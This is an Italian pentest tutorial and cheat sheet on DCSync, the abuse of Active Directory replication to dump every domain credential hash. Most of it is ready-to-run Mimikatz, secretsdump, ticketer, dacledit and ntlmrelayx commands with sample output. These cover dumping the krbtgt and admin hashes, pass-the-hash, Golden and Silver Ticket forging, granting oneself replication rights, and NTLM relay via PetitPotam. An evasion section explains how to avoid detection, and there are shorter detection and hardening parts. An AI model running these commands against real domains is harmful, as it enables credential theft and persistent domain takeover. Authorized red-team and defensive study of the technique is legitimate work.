---
title: 'DCSync: Dump delle Credenziali Active Directory via Replication Abuse'
slug: dcsync
description: DCSync è una tecnica di Active Directory che permette di estrarre hash delle credenziali abusando del meccanismo di replica del dominio. Utilizzata in post-exploitation per ottenere NTLM hash di utenti privilegiati senza accesso diretto al Domain Controller.
image: /Gemini_Generated_Image_k0byulk0byulk0by.webp
draft: true
date: 2026-02-10T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - credential dumping
---

> **Executive Summary** — DCSync è una delle tecniche più potenti nel pentest Active Directory. Permette di estrarre l'hash NTLM di qualsiasi utente del dominio — incluso `krbtgt` (per il Golden Ticket) e tutti i Domain Admin — senza eseguire codice sul Domain Controller, senza toccare il file NTDS.dit e senza privilegi di amministratore locale sul DC. L'attacco sfrutta il protocollo di replica dei Domain Controller (MS-DRSR): un attacker con i permessi giusti chiede al DC "mandami gli hash di questo utente" e il DC risponde, credendo di parlare con un altro Domain Controller. È il path definitivo per il dominio completo.**TL;DR**DCSync simula un Domain Controller che richiede la replica: il DC legittimo restituisce gli hash NTLM degli utenti.Permessi richiesti:
> DS-Replication-Get-Changes\
> DS-Replication-Get-Changes-All\
> DS-Replication-Get-Changes-In-Filtered-SetCon l'hash di krbtgt puoi forgiare un Golden Ticket e ottenere accesso persistente al dominio.

## Perché DCSync è Così Importante

Prima di DCSync, per ottenere tutti gli hash del dominio dovevi:

1. Compromettere il Domain Controller (RDP, PsExec, WMI)
2. Eseguire `ntdsutil` o copiare `NTDS.dit` + `SYSTEM` hive
3. Estrarre gli hash offline con [`secretsdump.py`](https://hackita.it/articoli/secretsdump)

Questo era rumoroso: accesso al DC, copia di file, processi sospetti. DCSync cambia tutto: non serve accesso al DC. Basta un utente con i permessi di replica e una workstation qualsiasi sulla rete. Il DC ti invia gli hash pensando che tu sia un altro DC che sta sincronizzando.

La tecnica è stata implementata da Benjamin Delpy ([Mimikatz](https://hackita.it/articoli/mimikatz)) e Vincent Le Toux nel 2015. Da allora è lo standard de facto per il credential dumping in Active Directory.

## 1. Anatomia Tecnica — Come Funziona la Replica

### Il Protocollo MS-DRSR

Active Directory usa il protocollo **MS-DRSR** (Directory Replication Service Remote Protocol) per sincronizzare i dati tra Domain Controller. Quando un DC viene aggiunto alla foresta, deve ricevere una copia del database (NTDS.dit) dagli altri DC. Periodicamente, i DC si sincronizzano per propagare le modifiche (nuovi utenti, password cambiate, policy aggiornate).

Il flusso di replica legittimo:

```
DC02 → DC01: "Ho bisogno degli aggiornamenti dall'ultimo sync" (DRSGetNCChanges)
DC01 → DC02: "Ecco i dati aggiornati, inclusi gli hash delle password"
```

DCSync sfrutta esattamente questo meccanismo:

```
Attacker (workstation) → DC01: "Ho bisogno degli hash di Administrator" (DRSGetNCChanges)
DC01 → Attacker: "Ecco l'hash NTLM di Administrator: aad3b435..."
```

Il DC non verifica se il richiedente è davvero un Domain Controller. Verifica solo se l'account che fa la richiesta ha i **permessi di replica** nell'ACL dell'oggetto dominio.

### I 3 Permessi Necessari

Per eseguire DCSync, l'account compromesso deve avere questi permessi sull'oggetto dominio (la root del dominio in AD):

| Permesso                                       | GUID                                   | Cosa permette                              |
| ---------------------------------------------- | -------------------------------------- | ------------------------------------------ |
| **DS-Replication-Get-Changes**                 | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | Leggere i dati replicati                   |
| **DS-Replication-Get-Changes-All**             | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | Leggere dati confidenziali (hash password) |
| **DS-Replication-Get-Changes-In-Filtered-Set** | `89e95b76-444d-4c62-991a-0facbeda640c` | Leggere dati nel filtered attribute set    |

**Chi ha questi permessi di default?**

* **Domain Admins** — sempre
* **Enterprise Admins** — sempre
* **Administrators** (built-in) — sempre
* **Domain Controllers** (gruppo) — sempre
* **Account con delega esplicita** — questo è il vettore di escalation

Il punto chiave: se durante il pentest ottieni un account Domain Admin, Enterprise Admin o qualsiasi account a cui qualcuno ha delegato i permessi di replica, puoi fare DCSync immediatamente.

## 2. Prerequisiti — Cosa Serve

### Cosa devi avere

```
1. Un account con permessi di replica (DA, EA, o delega esplicita)
2. Connettività di rete verso il Domain Controller (porta 135 + RPC dinamiche, o 389/636 LDAP)
3. Un tool: Mimikatz, secretsdump.py (Impacket), o DSInternals
```

### Verifica dei permessi

Prima di eseguire DCSync, verifica che il tuo account abbia i permessi necessari.

**Con PowerView:**

```powershell
# Importa PowerView
Import-Module .\PowerView.ps1

# Cerca chi ha permessi di replica
Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs | 
  Where-Object { $_.ObjectAceType -match "DS-Replication-Get-Changes" } |
  Select-Object SecurityIdentifier, ObjectAceType | 
  ForEach-Object { 
    $_ | Add-Member -NotePropertyName "Principal" -NotePropertyValue (
      New-Object System.Security.Principal.SecurityIdentifier($_.SecurityIdentifier)
    ).Translate([System.Security.Principal.NTAccount]).Value -PassThru
  }
```

**Output:**

```
Principal                  ObjectAceType
---------                  -------------
CORP\Domain Admins         DS-Replication-Get-Changes
CORP\Domain Admins         DS-Replication-Get-Changes-All
CORP\Enterprise Admins     DS-Replication-Get-Changes
CORP\Enterprise Admins     DS-Replication-Get-Changes-All
CORP\svc_backup            DS-Replication-Get-Changes
CORP\svc_backup            DS-Replication-Get-Changes-All
```

**Lettura dell'output:** oltre ai gruppi standard (DA, EA), l'account `svc_backup` ha permessi di replica — probabilmente un service account per il backup di AD. Se comprometti `svc_backup`, puoi fare DCSync senza essere Domain Admin.

**Con ldapsearch (da Linux):**

```bash
ldapsearch -x -H ldap://10.10.10.10 -D "corp\j.smith" -w 'Password123!' \
  -b "DC=corp,DC=local" -s base "(objectClass=*)" nTSecurityDescriptor \
  | grep -i "replication"
```

**Con Impacket dacledit.py:**

```bash
dacledit.py -action read -target "DC=corp,DC=local" -principal svc_backup \
  corp.local/j.smith:'Password123!'
```

## 3. Esecuzione DCSync — I Tool

### Metodo 1: Mimikatz (da Windows)

```
# Singolo utente
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# Tutti gli utenti
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

**Output (singolo utente):**

```
[DC] 'corp.local' will be the domain
[DC] 'DC01.corp.local' will be the DC server
[DC] 'Administrator' will be the the user account

Object RDN           : Administrator

** SAM ACCOUNT **
SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 12/15/2025 14:23:11
Object Security ID   : S-1-5-21-1234567890-1234567890-1234567890-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4
    ntlm- 0: 32ed87bdb5fdc5e9cba88547376818d4
    lm  - 0: aad3b435b51404eeaad3b435b51404ee

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : CORP.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : b7268f45...
      aes128_hmac       (4096) : 9a3e21cd...
      des_cbc_md5       (4096) : 1234abcd...
```

**Lettura dell'output — cosa hai ottenuto:**

* **Hash NTLM**: `32ed87bdb5fdc5e9cba88547376818d4` — puoi fare Pass-the-Hash con questo hash per autenticarti come Administrator su qualsiasi servizio del dominio (SMB, WinRM, RDP con restricted admin, LDAP)
* **AES256 key**: `b7268f45...` — puoi creare Kerberos ticket (Silver/Golden) con questa chiave, più stealth del Pass-the-Hash
* **Password last change**: ti dice quanto è "fresca" la password — se cambiata di recente, qualcuno potrebbe averla ruotata dopo una detection

### Metodo 2: secretsdump.py (da Linux — [Impacket](https://hackita.it/articoli/impacket))

```bash
# Con password
secretsdump.py corp.local/Administrator:'P@ssw0rd'@10.10.10.10

# Con hash (Pass-the-Hash)
secretsdump.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 corp.local/Administrator@10.10.10.10

# Solo DCSync (senza dump SAM/LSA locale)
secretsdump.py -just-dc corp.local/Administrator:'P@ssw0rd'@10.10.10.10

# Solo hash NTLM (no Kerberos keys)
secretsdump.py -just-dc-ntlm corp.local/Administrator:'P@ssw0rd'@10.10.10.10

# Solo un utente specifico
secretsdump.py -just-dc-user krbtgt corp.local/Administrator:'P@ssw0rd'@10.10.10.10
```

**Output (completo):**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f3bc61e97fb14d18c42bcbf6c3a9055f:::
j.smith:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
s.jones:1104:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
svc_sql:1105:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
admin.backup:1110:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:a1b2c3d4e5f6789...
Administrator:aes256-cts-hmac-sha1-96:b7268f45a1b2c3d4...
[*] Cleaning up...
```

**Lettura dell'output — cosa hai:**

* **Ogni utente del dominio** con il suo hash NTLM — puoi fare Pass-the-Hash con qualsiasi account
* **krbtgt hash**: `f3bc61e97fb14d18c42bcbf6c3a9055f` — con questo crei il **Golden Ticket**
* **krbtgt AES256 key**: `a1b2c3d4e5f6789...` — Golden Ticket con AES (più stealth)
* **Service account** (`svc_sql`): hash crackabile e usabile per lateral movement
* Il formato è `user:RID:LM_hash:NT_hash` — l'LM hash `aad3b435...` è vuoto (disabilitato nelle versioni moderne)

### Metodo 3: DSInternals (PowerShell)

```powershell
Install-Module DSInternals -Force
Import-Module DSInternals

# Get tutti gli hash via replica
Get-ADReplAccount -All -Server DC01.corp.local -NamingContext "DC=corp,DC=local" |
  Format-Table SamAccountName, @{N='NTHash';E={$_.NTHash | ConvertTo-Hex}}
```

## 4. Cosa Fare con gli Hash — Post-DCSync

### Pass-the-Hash — Accesso immediato

```bash
# SMB con hash Administrator
crackmapexec smb 10.10.10.0/24 -u Administrator -H 32ed87bdb5fdc5e9cba88547376818d4

# PsExec con hash
psexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 corp.local/Administrator@10.10.10.10

# WinRM con hash
evil-winrm -i 10.10.10.10 -u Administrator -H 32ed87bdb5fdc5e9cba88547376818d4
```

### Golden Ticket — Persistenza Totale

L'hash `krbtgt` è il segreto usato per firmare tutti i [Kerberos](https://hackita.it/articoli/kerberos) ticket del dominio. Con questo hash puoi creare un TGT (Ticket Granting Ticket) per qualsiasi utente — incluso un utente inesistente con permessi di Domain Admin. Il Golden Ticket è valido fino a quando l'hash di `krbtgt` non viene cambiato **due volte** (perché AD mantiene la password corrente e quella precedente).

**Con Mimikatz:**

```
mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local \
  /sid:S-1-5-21-1234567890-1234567890-1234567890 \
  /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f \
  /ptt
```

Parametri:

* `/user:fakeadmin` — qualsiasi nome, anche inesistente
* `/domain:corp.local` — il dominio
* `/sid:S-1-5-21-...` — il SID del dominio (dalla fase di enumeration)
* `/krbtgt:f3bc61...` — l'hash NTLM di krbtgt (dal DCSync)
* `/ptt` — Pass-the-Ticket: inietta il ticket in memoria immediatamente

**Con Impacket ticketer.py:**

```bash
ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  fakeadmin

# Usa il ticket
export KRB5CCNAME=fakeadmin.ccache
psexec.py -k -no-pass corp.local/fakeadmin@DC01.corp.local
```

**Con AES256 (più stealth — evita downgrade detection):**

```bash
ticketer.py -aesKey a1b2c3d4e5f6789... \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  fakeadmin
```

**Durata del Golden Ticket:** di default un TGT Kerberos dura 10 ore con rinnovo fino a 7 giorni. Ma Mimikatz/ticketer creano Golden Ticket con durata personalizzabile — puoi impostare 10 anni. Il DC non lo verifica perché il ticket è firmato con l'hash corretto di krbtgt.

### Silver Ticket — Accesso a un Servizio Specifico

Con l'hash di un service account (es: `svc_sql`), crei un Silver Ticket per accedere solo a quel servizio (MSSQL, HTTP, CIFS) senza contattare il DC — completamente offline e invisibile al DC.

```bash
ticketer.py -nthash a87f3a337d73085c45f9416be5787d86 \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  -spn MSSQLSvc/sql01.corp.local:1433 \
  fakeadmin

export KRB5CCNAME=fakeadmin.ccache
mssqlclient.py -k -no-pass corp.local/fakeadmin@sql01.corp.local
```

### Crack degli hash — Quando serve la password in chiaro

```bash
# Crack NTLM con hashcat
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Output:
# 64f12cddaa88057e06a81b54e73b949b:Summer2025!
# e19ccf75ee54e06b06a5907af13cef42:Corp@2026
```

La password in chiaro serve per: accesso a servizi che non accettano hash (VPN, OWA, portali web), credential reuse su servizi cloud (Azure AD, AWS SSO), documentazione nel report.

## 5. Come Ottieni i Permessi di Replica — Path di Escalation

Se non sei già Domain Admin, ci sono diversi modi per ottenere i permessi necessari al DCSync.

### Path 1: Comprometti un Domain Admin

Il modo più diretto. DA ha i permessi di replica di default.

```bash
# Se hai l'hash di un DA da Kerberoasting, password spray, etc:
secretsdump.py -hashes :DA_HASH corp.local/da_user@10.10.10.10 -just-dc
```

### Path 2: Trova un account con delega di replica

Alcuni ambienti hanno service account con permessi di replica per backup o sincronizzazione.

```powershell
# Cerca account non-standard con permessi di replica
Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs | 
  Where-Object { 
    ($_.ObjectAceType -match "DS-Replication-Get-Changes") -and
    ($_.SecurityIdentifier -notmatch "S-1-5-21.*-512|S-1-5-21.*-519|S-1-5-21.*-516|S-1-5-9")
  }
```

### Path 3: Aggiungi i permessi di replica (se hai WriteDACL)

Se hai il permesso `WriteDACL` sull'oggetto dominio (o sei Owner), puoi auto-assegnarti i permessi di replica.

```powershell
# Con PowerView
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity j.smith \
  -Rights DCSync -Verbose
```

```bash
# Con Impacket dacledit.py
dacledit.py -action write -rights DCSync -principal j.smith \
  -target-dn "DC=corp,DC=local" \
  corp.local/j.smith:'Password123!'
```

**Output:**

```
[*] DACL modified. j.smith now has DCSync rights.
```

**Cosa è successo:** hai aggiunto i tre permessi di replica al tuo account. Ora puoi eseguire DCSync come se fossi un DC.

### Path 4: Comprometti un account con GenericAll/GenericWrite sul dominio

Se hai `GenericAll` o `GenericWrite` sull'oggetto dominio, puoi modificare la DACL e darti i permessi di replica.

### Path 5: Comprometti l'account macchina del DC

L'account macchina del Domain Controller (`DC01$`) ha i permessi di replica. Se comprometti l'hash di `DC01$` (via NTLM relay, unconstrained delegation, etc), puoi fare DCSync.

```bash
secretsdump.py -hashes :DC01_MACHINE_HASH 'corp.local/DC01$'@10.10.10.10 -just-dc
```

## 6. Scenari Pratici di Pentest

### Scenario 1: Kerberoasting → DA → DCSync

**Step 1:** Kerberoasting — trovi un SPN con password debole

```bash
GetUserSPNs.py corp.local/j.smith:'Password123!' -dc-ip 10.10.10.10 -request
hashcat -m 13100 tgs_hash.txt rockyou.txt
# Cracka: svc_admin:Admin2025!
```

**Step 2:** svc\_admin è Domain Admin → DCSync

```bash
secretsdump.py corp.local/svc_admin:'Admin2025!'@10.10.10.10 -just-dc
```

**Step 3:** Golden Ticket per persistenza

**Tempo stimato:** 15-30 minuti

### Scenario 2: ACL abuse → WriteDACL → DCSync

**Step 1:** enumera ACL con BloodHound — trovi che `j.smith` ha `WriteDACL` sul dominio

**Step 2:**

```bash
dacledit.py -action write -rights DCSync -principal j.smith \
  -target-dn "DC=corp,DC=local" corp.local/j.smith:'Password123!'
```

**Step 3:**

```bash
secretsdump.py corp.local/j.smith:'Password123!'@10.10.10.10 -just-dc
```

**Step 4:** pulisci — rimuovi i permessi di replica

```bash
dacledit.py -action remove -rights DCSync -principal j.smith \
  -target-dn "DC=corp,DC=local" corp.local/j.smith:'Password123!'
```

**Tempo stimato:** 5-10 minuti

### Scenario 3: NTLM relay → DC machine account → DCSync

**Step 1:** PetitPotam/PrinterBug: coerce l'autenticazione del DC

```bash
PetitPotam.py 10.10.10.200 10.10.10.10
```

**Step 2:** ntlmrelayx intercetta e relay a un altro DC

```bash
ntlmrelayx.py -t ldaps://DC02.corp.local --escalate-user j.smith
```

**Step 3:** ntlmrelayx aggiunge permessi DCSync a j.smith automaticamente

**Step 4:**

```bash
secretsdump.py corp.local/j.smith:'Password123!'@10.10.10.10 -just-dc
```

**Tempo stimato:** 5-15 minuti

## 7. Detection & Evasion

### Blue Team — Come Rilevare DCSync

**Event ID Windows:**

* **4662** (Audit Directory Service Access): operazione su oggetto DS con GUID dei permessi di replica
* Filtra per GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` o `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`
* Se l'account che esegue la replica **non è un Domain Controller**, è DCSync

**Sigma rule (concetto):**

```yaml
detection:
  selection:
    EventID: 4662
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
  filter:
    SubjectUserName|endswith: '$'  # Account macchina DC legittimi
    SubjectUserName|contains:
      - 'DC01$'
      - 'DC02$'
  condition: selection and not filter
```

**MDI (Microsoft Defender for Identity):** rileva DCSync come alert ad alta severità — confronta l'IP sorgente con la lista dei DC noti.

**Network detection:**

* Traffico DRSUAPI (RPC) da un IP che non è un DC → alert
* Zeek/Suricata con signature per DRSGetNCChanges da host non-DC

### Evasion

```
Tecnica: Esegui DCSync dal Domain Controller stesso
Come: se hai shell sul DC, esegui Mimikatz lì — la replica da DC a DC è legittima
Riduzione rumore: il traffico DRSUAPI arriva da un DC → nessun alert
```

```
Tecnica: Richiedi un utente alla volta (non /all)
Come: mimikatz # lsadump::dcsync /user:krbtgt — solo krbtgt, non dump completo
Riduzione rumore: meno eventi 4662, meno traffico di rete
```

```
Tecnica: Usa AES key per Golden Ticket (non NTLM)
Come: ticketer.py -aesKey [key] — evita il downgrade a RC4
Riduzione rumore: i Golden Ticket con RC4 generano alert "Kerberos encryption downgrade"
```

```
Tecnica: Esegui in orari di replica legittima
Come: AD replica ogni 15 minuti di default — sincronizza il DCSync con i cicli
Riduzione rumore: il traffico DRSUAPI si mescola con la replica legittima
```

## 8. Toolchain e Confronto

| Tool               | Piattaforma      | Pro                                    | Contro                |
| ------------------ | ---------------- | -------------------------------------- | --------------------- |
| **secretsdump.py** | Linux (Impacket) | Remoto, no bisogno di shell su Windows | Richiede Python       |
| **Mimikatz**       | Windows          | Completo (DCSync + PTH + Golden)       | Rilevato da AV/EDR    |
| **DSInternals**    | PowerShell       | Nativo PS, facile da scriptare         | Richiede modulo       |
| **SharpKatz**      | Windows (.NET)   | Meno rilevato di Mimikatz              | Meno features         |
| **Rubeus**         | Windows (.NET)   | Golden/Silver ticket                   | Non fa DCSync diretto |

## 9. Troubleshooting

| Errore                                 | Causa                                | Fix                                                                           |
| -------------------------------------- | ------------------------------------ | ----------------------------------------------------------------------------- |
| `ERROR_DS_DRA_ACCESS_DENIED`           | Account senza permessi di replica    | Verifica ACL: hai DS-Replication-Get-Changes-All?                             |
| secretsdump timeout                    | Firewall blocca RPC                  | Verifica porte: 135 + RPC dinamiche (49152-65535) o usa `-port 636` per LDAPS |
| Mimikatz `ERROR kuhl_m_lsadump_dcsync` | Versione Mimikatz incompatibile o AV | Aggiorna Mimikatz, usa secretsdump.py da Linux                                |
| Golden Ticket non funziona             | SID dominio errato                   | Verifica con `Get-ADDomain \| select DomainSID` o `lookupsid.py`              |
| `KDC_ERR_TGT_REVOKED`                  | krbtgt password cambiata             | Rifai DCSync per ottenere il nuovo hash krbtgt                                |
| Accesso negato dopo Golden Ticket      | Protected Users group                | I membri di Protected Users non accettano RC4 — usa AES key                   |

## 10. FAQ

**D: DCSync funziona tra foreste (forest trust)?**
R: Dipende. Se c'è un trust bidirezionale con SID history abilitato, puoi fare DCSync cross-forest con un Golden Ticket che include il SID di Enterprise Admin dell'altra foresta. Con SID filtering attivo (default per external trust), non funziona.

**D: Quanto dura un Golden Ticket?**
R: Finché l'hash di krbtgt non viene cambiato **due volte**. AD mantiene la password corrente e quella precedente di krbtgt. Dopo un singolo reset, il vecchio hash funziona ancora (come password precedente). Dopo il secondo reset, l'hash vecchio non è più valido. In molti ambienti, krbtgt non viene mai ruotato — il Golden Ticket dura anni.

**D: Serve un Domain Admin per DCSync?**
R: No necessariamente. Serve un account con permessi di replica. DA li ha di default, ma anche account con delega esplicita (backup agent, tool di sincronizzazione AD) o account che ottieni tramite ACL abuse (WriteDACL → aggiungi i permessi).

**D: Un EDR rileva DCSync?**
R: MDI (Microsoft Defender for Identity) rileva DCSync analizzando il traffico di rete e gli eventi 4662. EDR endpoint (CrowdStrike, SentinelOne) rilevano Mimikatz ma non necessariamente secretsdump.py eseguito da Linux. Il detection rate dipende dalla maturità del SOC.

## 11. Cheat Sheet Finale

### Enumerazione permessi

| Azione         | Comando                                                                                                     |
| -------------- | ----------------------------------------------------------------------------------------------------------- |
| Chi ha replica | PowerView: `Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs \| Where ObjectAceType -match Replication` |
| Verifica ACL   | `dacledit.py -action read -target "DC=corp,DC=local" -principal [user]`                                     |
| BloodHound     | Cerca path "DCSync" nel grafo                                                                               |

### Esecuzione DCSync

| Azione           | Comando                                                 |
| ---------------- | ------------------------------------------------------- |
| Singolo utente   | `secretsdump.py -just-dc-user krbtgt corp/DA:'pass'@DC` |
| Tutto il dominio | `secretsdump.py -just-dc corp/DA:'pass'@DC`             |
| Solo NTLM        | `secretsdump.py -just-dc-ntlm corp/DA:'pass'@DC`        |
| Con hash         | `secretsdump.py -hashes :HASH corp/DA@DC -just-dc`      |
| Mimikatz         | `lsadump::dcsync /domain:corp.local /user:krbtgt`       |
| Mimikatz all     | `lsadump::dcsync /domain:corp.local /all /csv`          |

### Post-DCSync

| Azione        | Comando                                                                         |
| ------------- | ------------------------------------------------------------------------------- |
| Pass-the-Hash | `psexec.py -hashes :HASH corp/Administrator@DC`                                 |
| Golden Ticket | `ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain corp.local fakeadmin`  |
| Silver Ticket | `ticketer.py -nthash SVC_HASH -domain-sid SID -spn SPN -domain corp.local user` |
| Crack NTLM    | `hashcat -m 1000 hashes.txt wordlist`                                           |
| Usa ticket    | `export KRB5CCNAME=ticket.ccache; psexec.py -k -no-pass corp/user@target`       |

### Aggiungere permessi DCSync

| Azione    | Comando                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------- |
| PowerView | `Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity user -Rights DCSync` |
| Impacket  | `dacledit.py -action write -rights DCSync -principal user corp/DA:'pass'`                       |
| Rimuovi   | `dacledit.py -action remove -rights DCSync -principal user corp/DA:'pass'`                      |

### Hardening

* **Audit** event 4662 con GUID di replica — alert se l'account non è un DC
* **MDI/ATA** per detection automatica DCSync
* **Tier model**: separa gli account — DA usato solo su DC, mai su workstation
* **Riduci** gli account con permessi di replica al minimo (solo DC)
* **Ruota krbtgt** periodicamente (due volte per invalidare Golden Ticket)
* **Protected Users group** per gli account admin (no RC4, no delegation, no caching)
* **LAPS/gMSA** per service account — evita password statiche crackabili
* **Credential Guard** sui DC per proteggere i segreti in memoria

### OPSEC

DCSync genera eventi 4662 con i GUID di replica — facilmente filtrabili. MDI rileva DCSync confrontando l'IP sorgente con i DC noti. Eseguire DCSync dal DC stesso è il modo più stealth. Richiedere un singolo utente (`/user:krbtgt`) genera meno rumore di `/all`. Il Golden Ticket con AES256 evita l'alert di encryption downgrade. Dopo il pentest, rimuovi sempre i permessi DCSync aggiunti e cancella i Golden Ticket creati.

***

Riferimento: Benjamin Delpy (Mimikatz), SpecterOps "An ACE Up the Sleeve", Rhino Security, Microsoft MS-DRSR documentation. Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
